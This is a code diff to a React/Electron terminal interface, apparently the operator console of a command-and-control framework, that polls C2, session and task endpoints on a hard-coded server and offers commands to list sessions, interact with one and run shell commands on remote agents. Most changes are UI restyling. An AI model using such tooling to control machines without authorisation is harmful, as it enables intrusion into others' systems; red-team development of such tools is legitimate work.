@@ -7,6 +7,9 @@ import styles from './Home.css';
 import Terminal from 'terminal-in-react';
 import SessionTracker from '../utils/SessionTracker';
 
+import MenuBar from './MenuBar';
+import WindowControls from './WindowControls';
+
 const remote = require('electron').remote;
 
 type Props = {
@@ -36,7 +39,7 @@ export default class PrismaticInterpreter extends Component<Props> {
   }
   componentDidMount() {
     this.interval = setInterval(() => {
-      fetch('http://142.93.3.119:29001/api/c2', {
+      fetch('http://192.168.86.240:29001/api/c2', {
         method: 'POST',
         headers: {
           'Accept': 'application/json',
@@ -53,7 +56,7 @@ export default class PrismaticInterpreter extends Component<Props> {
       );
       //Data to Mount
       //Check for new sessions
-      fetch('http://142.93.3.119:29001/api/sessions', {
+      fetch('http://192.168.86.240:29001/api/sessions', {
         method: 'POST',
         headers: {
           'Accept': 'application/json',
@@ -114,7 +117,7 @@ export default class PrismaticInterpreter extends Component<Props> {
     });
     //If no id user not interacting with session
 
-    fetch('http://142.93.3.119:29001/api/task', {
+    fetch('http://192.168.86.240:29001/api/task', {
       method: 'POST',
       headers: {
         'Accept': 'application/json',
@@ -182,103 +185,88 @@ export default class PrismaticInterpreter extends Component<Props> {
       addSession
     } = this.props;
     return (
-      <div className={styles.container} data-tid="container">
-      <div className="dragbar"></div>
-      <div
-        style={{
-          display: "flex",
-          justifyContent: "center",
-          alignItems: "center",
-          height: "100vh",
-          width: "100vw"
-        }}
-        >
-          <Terminal
-           plugins={[
-             {
-               class: SessionTracker,
-               config: {
-                 sessions: sessions
+      <div className={styles.basecontainer}>
+
+        <WindowControls />
+        <MenuBar />
+
+        <div className={styles.container} data-tid="container">
+        <div className={styles.termcontainer}>
+        <div
+          style={{
+            display: "flex",
+            justifyContent: "center",
+            alignItems: "center",
+            height: "100vh",
+            width: "100vw"
+          }}
+          >
+            <Terminal
+             plugins={[
+               {
+                 class: SessionTracker,
+                 config: {
+                   sessions: sessions
+                 }
                }
-             }
-           ]}
-           color='green'
-           value="ttt"
-           onChange={this.handleChange}
-           promptSymbol={this.state.prompt}
-           backgroundColor='black'
-           barColor='black'
-           startState='maximised'
-           style={{ fontWeight: "bold", fontSize: "1em", width: "100%" }}
-           actionHandlers={{
-              handleClose: (toggleClose) => {
-                // do something on close
-                toggleClose();
-              },
-              handleMaximise: (toggleMaximise) => {
-                // do something on maximise
-                toggleMaximise();
-              }
-           }}
-           commands={{
-              color: {
-                method: (args, print, runCommand) => {
-                  print(`The color is ${args._[0] || args.color}`);
+             ]}
+             color='green'
+             value="ttt"
+             onChange={this.handleChange}
+             promptSymbol={this.state.prompt}
+             backgroundColor='black'
+             barColor='black'
+             startState='maximised'
+             style={{ fontWeight: "bold", fontSize: "1em", width: "100%" }}
+             actionHandlers={{
+                handleClose: (toggleClose) => {
+                  // do something on close
+                  toggleClose();
+                },
+                handleMaximise: (toggleMaximise) => {
+                  // do something on maximise
+                  toggleMaximise();
                 }
-              },
-              sessions: {
-                method: (args, print, runCommand) => {
-                  let ret = this.listSessions()
-                  //print(ret)
+             }}
+             commands={{
+                sessions: {
+                  method: (args, print, runCommand) => {
+                    let ret = this.listSessions()
+                    //print(ret)
 
 
-                }
-              },
-              shell: {
-                method: (args, print, runCommand) => {
-                  this.setState({
-                     task: args._[0],
-                     agentid: this.state.session
-                  });
-                  this.emCreateTask(args);
-                }
-              },
-              interact: {
-                method: (args, print, runCommand) => {
-                  this.setState({
-                     prompt: "PROMPT(" + args._[0].toString() + ") > ",
-                     session: args._[0]
-                  });
-                }
-              },
-              wtf: {
-                method: (args, print, runCommand) => {
-                  {addSession({
-                      aid: "24464303",
-                      type: "Gryffindor"
-                    })
+                  }
+                },
+                shell: {
+                  method: (args, print, runCommand) => {
+                    this.setState({
+                       task: args._[0],
+                       agentid: this.state.session
+                    });
+                    this.emCreateTask(args);
+                  }
+                },
+                interact: {
+                  method: (args, print, runCommand) => {
+                    this.setState({
+                       prompt: "PROMPT(" + args._[0].toString() + ") > ",
+                       session: args._[0]
+                    });
                   }
                 }
-              },
-              tt: () => {addSession},
-              showmsg: "asdf",//this.showMsg,
-              popup: () => alert('Terminal in React'),
-              test: {
-                method: (args, print, runCommand) => {
-                  runCommand(showmsg);
-                  runCommand(wtf);
-                }
-              }
-           }}
-           descriptions={{
-              'open-google': 'opens google.com',
-              showmsg: 'shows a message',
-              alert: 'alert', popup: 'alert'
-           }}
-           watchConsoleLogging
-           setPromptPrefix='true'
-           allowTabs="false"
-          />
+             }}
+             descriptions={{
+                'open-google': 'opens google.com',
+                sessions: 'list all active sessions',
+                shell: 'run a shell command on the current session',
+                interact: 'interact with a given session id'
+             }}
+             watchConsoleLogging
+             setPromptPrefix='true'
+             allowTabs="false"
+            />
+          </div>
+          </div>
         </div>
       </div>
     );
